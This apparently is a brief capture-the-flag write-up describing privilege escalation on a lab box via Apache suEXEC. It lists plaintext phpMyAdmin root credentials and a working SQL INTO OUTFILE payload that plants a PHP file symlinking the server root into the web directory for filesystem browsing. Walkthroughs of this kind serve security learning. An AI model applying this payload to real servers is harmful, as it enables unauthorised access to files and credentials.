# Bonus - apache suEXEC 1

[Apache suEXEC privilege elevation](https://www.exploit-db.com/exploits/27397)

We start by navigating to `http://IP/phpmyadmin` using the previously obtained credentials: `root:Fg-'kKXBj87E:aJ$`. Next, we perform an SQL injection based on the information in the article, using a table with two columns:

``` sql
SELECT 1, '<?php symlink(\"/\", \"files.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/exec.php'
```

We trigger the exploit by accessing the `exec.php` file, then open `https://IP/forum/templates_c/files.php` to view the filesystem. From there, we proceed with the standard enumeration as outlined in Writeup 1—home, lookatme, password.
